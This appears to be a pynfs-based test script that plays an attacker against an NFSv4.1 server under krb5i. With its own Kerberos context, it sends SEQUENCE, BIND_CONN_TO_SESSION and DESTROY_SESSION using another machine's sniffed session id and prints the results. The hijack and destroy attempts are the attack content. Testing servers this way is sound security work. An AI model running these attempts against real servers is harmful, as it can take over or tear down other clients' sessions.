#!/usr/bin/env python3
"""A user with a valid ticket tries to use a session id it has seen.

Under sec=krb5i the session id crosses the wire in the clear. This plays the
attacker who sniffed it: an allowed principal (testuser) with its own
RPCSEC_GSS context, on its own TCP connection, naming another machine's
session. Run under pynfs (PYTHONPATH=/opt/pynfs, cwd /opt/pynfs/nfs4.1).

Prints one line per attempt: "<what> <NFS4 status name>".

    steal_session.py <server> <port> <session id as 32 hex digits>
"""
import sys

import rpc
from rpc.security import AuthGss
import nfs4client
import nfs_ops
from xdrdef.nfs4_const import nfsstat4, CDFC4_FORE_OR_BOTH

op = nfs_ops.NFS4ops()
host, port, sid = sys.argv[1], int(sys.argv[2]), bytes.fromhex(sys.argv[3])

c = nfs4client.NFS4Client(host, port, 1)
call = c.make_call_function(c.c1, 0, c.default_prog, c.default_vers)
cred = AuthGss().init_cred(call, target="nfs@%s" % host)
cred.service = 2  # rpc_gss_svc_integrity: krb5i
c.set_cred(cred)


def attempt(what, ops):
    res = c.compound(ops)
    print(what, nfsstat4.get(res.status, res.status), flush=True)


# A high seqid so a slot it did reach would not be a plain retry.
attempt("sequence", [op.sequence(sid, 100, 0, 0, False), op.putrootfh()])
attempt("bind_conn", [op.bind_conn_to_session(sid, CDFC4_FORE_OR_BOTH, False)])
attempt("destroy_session", [op.destroy_session(sid)])
